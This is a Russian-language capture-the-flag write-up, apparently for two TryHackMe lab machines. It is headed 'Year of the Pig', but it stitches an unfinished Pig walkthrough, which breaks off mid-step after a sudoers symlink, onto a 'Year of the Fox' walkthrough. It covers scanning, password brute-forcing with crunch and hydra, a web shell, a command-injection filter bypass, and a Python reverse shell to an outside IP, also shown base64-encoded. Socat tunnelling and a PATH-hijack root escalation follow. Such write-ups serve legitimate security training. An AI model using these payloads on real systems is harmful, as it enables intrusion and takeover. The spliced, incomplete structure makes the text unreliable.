# Year of the Pig

:white_check_mark:  [**Enum4linux**](#enum4linux)

:white_check_mark: [**Hydra**](#hydra)

:white_check_mark: [**Command Injection(filtering)**](#command_njection_filtering)

:white_check_mark: [**Socat tunneling**](#socat_tunneling)

:white_check_mark: [**Shutdown**](#shutdown)

:white_check_mark: [**PATH**](#PATH)

___

## Enumeration
Сканируем ip командой:
```
nmap -sV -sV pig.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Главная страница pig.thm

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/1.png)

Переберем директории с помощью gobuster:
```
gobuster dir -u http://pig.thm -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
```

```
/index.html           (Status: 200) [Size: 4801]
/login.php            (Status: 200) [Size: 2790]
/admin                (Status: 301) [Size: 302] [--> http://pig.thm/admin/]
/assets               (Status: 301) [Size: 303] [--> http://pig.thm/assets/]
/css                  (Status: 301) [Size: 300] [--> http://pig.thm/css/]   
/js                   (Status: 301) [Size: 299] [--> http://pig.thm/js/]    
/api                  (Status: 301) [Size: 300] [--> http://pig.thm/api/]
```

Перейдем на страницу **pig.thm/login.php**. Перед нами строка авторизации.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/2-1.png)

Введем случайные данные и перехватим запрос.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/2.png)

Во-первых, мы можем заметить, что наш пароль преобразуется в md5.
Во-вторых, мы не можем сбрутить пароли, т.к. всегда будем получать код ответа 200.

Но отправив запрос, на странице авторизации появляется подсказка.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/3.png)

Паролем является: памятное слово или же слово, которое легко запомнить + 2 цифры + 1 символ.

Покапавшись на странице, можно найти упоминание любимого самолета **marco - Savoia S21**.

Сгенерируем словарь для брута:
```
crunch 9 9 -t savoia%%^ > pass

9 9 - размер пароля от 9 до 9 символов, тоесть просто 9 символов
-t - пароль по образцу
% - любая цифра
^ - любой символ
```

Получив словарь, его нужно преобразовать в md5. Сделаем это при помощи питона.
```
import hashlib

file = open('path_to_file', 'r')
file_read = file.read()


words = list(file_read.split())

for word in words:
        hash = hashlib.md5(word.encode('utf-8')).hexdigest()
        print(hash)
```

```
python brute.py > pass_md5
```

Брутим с логином marco и словарем

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/4.png)

Находим пароль, преобразуем его обратно из md5 и логинимся.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/5.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/6.png)

Находим панель для выполнения команд. Перебрав разные варианты команд я решил, что это rabbit hole и решил попробовать эти данные для ssh и они подошли.
```
ssh marco@pig.thm
```

Подключивсяшь в машине и покопавшись в директории сайта, я нашел базу данных **admin.db**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/7.png)

Увы, взаимодействие с базой доступно только от пользователя www-data, поэтому закинем shell в директорию **/var/www/html**.

Запускаем слушатель и открываем shell: **http://pig.thm/shell.php**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/8.png)

Теперь, когда мы зашли под пользователем www-data, можем открыть базу данных.
```
sqlite3 admin.db
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/9.png)

Получаем пароли от юзеров. Сравнив пароль от marco с тем, который мы сбрутили, можем заметить, что они сходятся, значит пароль от curtis тоже в формате md5. Закинем его в [crackstation](https://crackstation.net/) и получим результат.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/10.png)

Логинимся под curtis.

Просмотрим права: **sudo -l**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/11.png)

Видим, что это предположительно может быть уязвимость связанная с wildcards. Проверим версию sudo:
```
sudo --version
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Pig/12.png)

Создадим символическую ссылку:
```
ln -s /etc/sudoers /var/www/html/assets/img/config.php

Вместо */* нужно вставить 2 существующие директории
```

У нас есть права для использования sudoedit, поэтому воспользуемся этим.





















































При переходе на сайт, нас встречает панель авторизации. Попробуем найти данные.

<a name="enum4linux"></a>

## Samba
Используем enum4linux для перечисления самбы
```
enum4linux fox.thm
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/1.png)

Получаем имена двух пользователей: fox, rascal.

## Hydra

Сбрутим пароль для пользователя rascal:
```
hydra -l rascal -P /usr/share/wordlists/rockyou.txt -f fox.thm http-get -t 64
```

```
[80][http-get] host: fox.thm   login: rascal   password: <REDACTED>
```

<a name="command_njection_filtering"></a>

## Command Injection(filtering)

Проходим авторизацию и попадаем на страницу.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/3.png)

Мы имеем строку поиска файлов, найдем уязвимость. Запускаем Burp Suite и перехватываем запрос. В запросе фильруются специальные символы, кроме " **\\** ".

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/4.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/5.png)

Наш экплоит будет выглядеть так:
```
"\";command;\""
```

Команда обратной оболочки:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.235",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Заодируем команду в base64 и модифицируем эксплоит:
```
"\";echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOC42MS4yMzUiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc= | base64 -d | bash;\""
```

Получаем shell. Закидываем linpeas. Видим, что открыт локальный порт 22.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/6.png)

Закинем бинарник nmap и просканируем локальную сеть.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/7.png)

Это порт ssh.

Просмотрим конфиг sshd_config

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/8.png)

Пользователь fox имеет доступ к ssh.

<a name="socat_tunneling"></a>

## Socat tunneling
Закинем бинарник socat, чтобы перенаправить 22 порт на порт 5555:

```
./socat tcp-l:5555,fork,reuseaddr tcp:localhost:22
```

<a name="hydra"></a>

Теперь мы можем сбрутить пароль от ssh юзера fox:
```
hydra -l fox -P /usr/share/wordlists/rockyou.txt -s 5555 fox.thm ssh
```

```
[5555][ssh] host: fox.thm   login: fox   password: <REDACTED>
```

Подключаемся по ssh
```
ssh -p 5555 fox@fox.thm
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/9.png)

<a name="shutdown"></a>

## Priviledge Escalation

Просмотрим права командой: **sudo -l**.
```
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

Отправим файл shutdown и просмотрим с помощью strings.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/10.png)

Двоичный файл вызывает другой файл под названием **poweroff**.

Посмотрев на выводы команды sudo -l на своей машине и атакуемой, можно заметить отличия.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/11.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/12.png)

<a name="PATH"></a>

Эта машина не использует secure_path в конфигурации sudoers.

Обычно, когда мы вызываем команду sudo, она игнорирует стандартный PATH и вместо него использует безопасный PATH, определенный в /etc/sudoers. Это делает очень сложным выполнение эксплойтов для манипуляции PATH. Но на этой машине нет secure_path, а значит, мы должны иметь возможность использовать PATH для получения root.
```
cp /bin/bash /tmp/poweroff

chmod +x /tmp/poweroff

export PATH=/tmp:$PATH

sudo /usr/sbin/shutdown
```

Получаем root

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/13.png)

Флаг находится не здесь, найдем его командой:
```
find /home -group root -type f 2>/dev/null
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Fox/14.png)